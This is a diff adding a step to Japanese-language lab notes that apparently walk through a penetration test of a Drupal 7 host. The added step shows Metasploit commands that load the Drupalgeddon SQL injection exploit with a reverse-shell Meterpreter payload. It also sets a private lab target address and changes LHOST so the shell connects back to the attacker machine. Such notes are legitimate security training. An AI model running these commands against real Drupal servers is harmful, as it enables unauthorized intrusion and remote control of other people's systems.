@@ -52,3 +52,17 @@ export URL="http://:80$IP/"
   - Drupal 7 remote		→検索<br>						
 脆弱性の名前として「Drupalgeddon」をメモ<br>	
 →Drupal のSQLインジェクションの脆弱性の通称
+
+10.MetasploitでDrupalgeddonを狙う
+```
+msfconsole									
+# [msf](Jobs:0 Agents:0) >> search type:exploit drupal									
+# [msf](Jobs:0 Agents:0) >> use exploit/multi/http/drupal_drupageddon
+# [] No payload configured, defaulting to php/meterpreter/reverse_tcp
+  ➢リバース型のペイロードがセットされた
+    ※今回の実験ではRHOST、RPORT、TARGETURIを設定（RHOST以外はデフォルトでOK）
+# [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set RHOSTS 192.168.56.103									
+[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> show options
+  ➢LHOSTが127.0.0.1だとExploitの攻撃が成功してもペイロードの接続先がloclhostになってしまい、ターゲット端末そのものになるため変更
+# [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set LHOST 192.168.56.101
+```
